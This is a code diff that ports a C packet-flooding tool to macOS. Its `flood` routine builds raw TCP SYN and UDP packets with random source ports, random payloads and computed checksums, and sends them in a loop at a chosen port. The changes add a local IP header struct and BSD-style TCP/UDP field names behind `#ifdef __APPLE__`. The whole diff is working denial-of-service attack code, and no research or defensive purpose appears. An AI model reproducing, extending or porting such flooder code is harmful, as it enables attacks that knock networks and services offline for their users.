@@ -11,7 +11,7 @@
 #include <sys/socket.h>
 #include <arpa/inet.h>
 #include <netinet/ip.h>
-#include "linux/tcp.h"
+#include <netinet/tcp.h>
 #include <netinet/in.h>
 #include <signal.h>//--
 #include <netinet/udp.h>  // struct udphdr
@@ -41,6 +41,23 @@ struct pseudo_header {
     uint8_t  placeholder;
     uint8_t  protocol;
     uint16_t tcp_length;
+};
+
+/* macOS exposes BSD's struct ip, not Linux's struct iphdr.  Keep the
+ * Linux-style field names used by this legacy packet builder local to the
+ * implementation so the header is complete when taking its address. */
+struct nero_iphdr {
+    uint8_t ihl:4;
+    uint8_t version:4;
+    uint8_t tos;
+    uint16_t tot_len;
+    uint16_t id;
+    uint16_t frag_off;
+    uint8_t ttl;
+    uint8_t protocol;
+    uint16_t check;
+    uint32_t saddr;
+    uint32_t daddr;
 };
 
 typedef struct {
@@ -165,14 +182,14 @@ static void *flood(void *arg)
 
         //             -------------------- TCP --------------------
         memset(datagram, 0, PACKET_SIZE);
-        struct iphdr *iph = (struct iphdr *)datagram;
-        struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct iphdr));
+        struct nero_iphdr *iph = (struct nero_iphdr *)datagram;
+        struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct nero_iphdr));
 
         // IP header for TCP
         iph->ihl = 5;
         iph->version = 4;
         iph->tos = 0;
-        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
+        iph->tot_len = htons(sizeof(struct nero_iphdr) + sizeof(struct tcphdr));
         iph->id = htons(rand_r(&seed) % 65535); // random port
         iph->ttl = 255;
         iph->protocol = IPPROTO_TCP;
@@ -187,15 +204,29 @@ static void *flood(void *arg)
         iph->check = checksum((unsigned short *)datagram, ntohs(iph->tot_len));
 
         // TCP header
-        tcph->source = htons(rand_r(&seed) % 65535);
-        tcph->dest = htons(port_select);
-        tcph->seq = rand_r(&seed);
+#ifdef __APPLE__
+        /* macOS (BSD): alan adları th_* önekli.  SYN ayrı bit değil,
+         * th_flags içinde TH_SYN bayrağıdır. */
+        tcph->th_sport = htons(rand_r(&seed) % 65535);
+        tcph->th_dport = htons(port_select);
+        tcph->th_seq   = rand_r(&seed);
+        tcph->th_ack   = 0;
+        tcph->th_off   = 5;
+        tcph->th_flags = TH_SYN;
+        tcph->th_win   = htons(32767 + rand_r(&seed) % (65536 - 32767));
+        tcph->th_sum   = 0;
+        tcph->th_urp   = 0;
+#else
+        tcph->source  = htons(rand_r(&seed) % 65535);
+        tcph->dest    = htons(port_select);
+        tcph->seq     = rand_r(&seed);
         tcph->ack_seq = 0;
-        tcph->doff = 5;
-        tcph->syn = 1;
-        tcph->window = htons(32767 + rand_r(&seed) % (65536 - 32767));
-        tcph->check = 0;
+        tcph->doff    = 5;
+        tcph->syn     = 1;
+        tcph->window  = htons(32767 + rand_r(&seed) % (65536 - 32767));
+        tcph->check   = 0;
         tcph->urg_ptr = 0;
+#endif
 
         struct pseudo_header psh_tcp;
         psh_tcp.source_address = iph->saddr;
@@ -213,7 +244,11 @@ static void *flood(void *arg)
         }
         memcpy(pseudogram_tcp, &psh_tcp, sizeof(struct pseudo_header));
         memcpy(pseudogram_tcp + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));
+#ifdef __APPLE__
+        tcph->th_sum = checksum((unsigned short *)pseudogram_tcp, psize_tcp);
+#else
         tcph->check = checksum((unsigned short *)pseudogram_tcp, psize_tcp);
+#endif
         free(pseudogram_tcp);
 
         sendto(sock_tcp, datagram, ntohs(iph->tot_len), 0, (struct sockaddr *)&sin, sizeof(sin));
@@ -221,12 +256,12 @@ static void *flood(void *arg)
 
         //             -------------------- UDP --------------------
         memset(datagram, 0, PACKET_SIZE);
-        iph = (struct iphdr *)datagram;
-        struct udphdr *udph = (struct udphdr *)(datagram + sizeof(struct iphdr));
+        iph = (struct nero_iphdr *)datagram;
+        struct udphdr *udph = (struct udphdr *)(datagram + sizeof(struct nero_iphdr));
 
         // Choose a random payload length (32-512 bytes)
         int payload_len = (rand_r(&seed) % 480) + 32; 
-        char *payload = datagram + sizeof(struct iphdr) + sizeof(struct udphdr);
+        char *payload = datagram + sizeof(struct nero_iphdr) + sizeof(struct udphdr);
 
         // Generate random payload contents
         for (int i = 0; i < payload_len; i++) {
@@ -237,7 +272,7 @@ static void *flood(void *arg)
         iph->ihl = 5;
         iph->version = 4;
         iph->tos = 0;
-        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + payload_len);
+        iph->tot_len = htons(sizeof(struct nero_iphdr) + sizeof(struct udphdr) + payload_len);
         iph->id = htons(rand_r(&seed) % 65535);
         iph->ttl = 255;
         iph->protocol = IPPROTO_UDP;
@@ -253,10 +288,18 @@ static void *flood(void *arg)
         iph->check = checksum((unsigned short *)datagram, ntohs(iph->tot_len));
 
         // UDP header
+#ifdef __APPLE__
+        /* macOS (BSD): alan adları uh_* önekli. */
+        udph->uh_sport = htons(rand_r(&seed) % 65535);
+        udph->uh_dport = htons(port_select);
+        udph->uh_ulen  = htons(sizeof(struct udphdr) + payload_len);
+        udph->uh_sum   = 0;
+#else
         udph->source = htons(rand_r(&seed) % 65535);
-        udph->dest = htons(port_select);
-        udph->len = htons(sizeof(struct udphdr) + payload_len);
-        udph->check = 0;
+        udph->dest   = htons(port_select);
+        udph->len    = htons(sizeof(struct udphdr) + payload_len);
+        udph->check  = 0;
+#endif
 
         // Pseudo-header for the UDP checksum
         struct pseudo_header psh_udp;
@@ -275,7 +318,11 @@ static void *flood(void *arg)
         }
         memcpy(pseudogram_udp, &psh_udp, sizeof(struct pseudo_header));
         memcpy(pseudogram_udp + sizeof(struct pseudo_header), udph, sizeof(struct udphdr) + payload_len);
+#ifdef __APPLE__
+        udph->uh_sum = checksum((unsigned short *)pseudogram_udp, psize_udp);
+#else
         udph->check = checksum((unsigned short *)pseudogram_udp, psize_udp);
+#endif
         free(pseudogram_udp);
 
         // Send the packet
